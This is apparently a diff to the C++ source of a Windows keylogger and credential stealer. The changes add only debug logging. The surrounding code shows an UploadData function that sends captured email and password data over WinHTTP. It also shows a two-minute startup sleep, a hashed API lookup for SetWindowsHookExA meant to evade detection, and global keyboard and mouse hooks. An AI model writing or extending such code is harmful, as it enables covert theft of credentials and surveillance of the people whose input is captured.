@@ -114,6 +114,7 @@ void UploadData(std::string email, std::string pass) {
             DWORD dwSize = sizeof(statusCode);
             WinHttpQueryHeaders(hR, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &dwSize, NULL);
             WriteDebug("Payload Delivered. Status: " + std::to_string(statusCode));
+            WriteDebug("Raw JSON: " + json);
         }
     }
     WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
@@ -201,6 +202,7 @@ LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
     Sleep(120000); 
+    WriteDebug("wait 2 minutes sleeping...");
     HMODULE u32 = GetModuleHandleA("user32.dll");
     auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
     if (!_SetHook) _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddress(u32, "SetWindowsHookExA");
@@ -208,6 +210,7 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
     if (_SetHook) {
         _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
         _SetHook(WH_MOUSE_LL, MouseProc, h, 0);
+        WriteDebug("Hooks Online. Monitoring input...");
     }
 
     MSG msg;
